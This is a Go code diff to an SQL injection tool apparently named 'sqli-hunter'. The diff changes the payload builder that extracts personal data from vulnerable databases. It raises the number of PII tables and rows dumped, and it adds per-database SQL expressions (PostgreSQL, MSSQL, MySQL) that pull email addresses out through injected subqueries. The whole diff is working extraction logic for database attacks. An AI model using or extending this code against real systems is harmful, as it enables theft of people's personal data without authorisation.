@@ -7,8 +7,8 @@ import (
 	"github.com/sqli-hunter/sqli-hunter/internal/models"
 )
 
-const maxPIITables = 3
-const maxPIIRows = 5
+const maxPIITables = 5
+const maxPIIRows = 15
 
 // BuildColumnsJob génère un payload pour lister les colonnes d'une table.
 func BuildColumnsJob(dbms, table string, vulnType models.VulnType) ExtractionJob {
@@ -110,7 +110,7 @@ func piiDumpExpr(dbms, table string, cols map[PIIColumnKind]string) string {
 	if !ok || col == "" {
 		return `NULL`
 	}
-	rowExpr := fmt.Sprintf(`CONCAT('email=',IFNULL(%s,''))`, quoteIdent(dbms, col))
+	rowExpr := emailRowExpr(dbms, col)
 
 	switch dbms {
 	case "postgresql":
@@ -122,6 +122,18 @@ func piiDumpExpr(dbms, table string, cols map[PIIColumnKind]string) string {
 	default:
 		return fmt.Sprintf(`(SELECT GROUP_CONCAT(row_data SEPARATOR ';;') FROM (SELECT %s AS row_data FROM %s LIMIT %d) pii_sub)`,
 			rowExpr, table, maxPIIRows)
+	}
+}
+
+func emailRowExpr(dbms, col string) string {
+	q := quoteIdent(dbms, col)
+	switch dbms {
+	case "postgresql":
+		return fmt.Sprintf(`'email=' || COALESCE(%s::text,'')`, q)
+	case "mssql":
+		return fmt.Sprintf(`'email='+ISNULL(CAST(%s AS varchar(max)),'')`, q)
+	default:
+		return fmt.Sprintf(`CONCAT('email=',IFNULL(%s,''))`, q)
 	}
 }
 
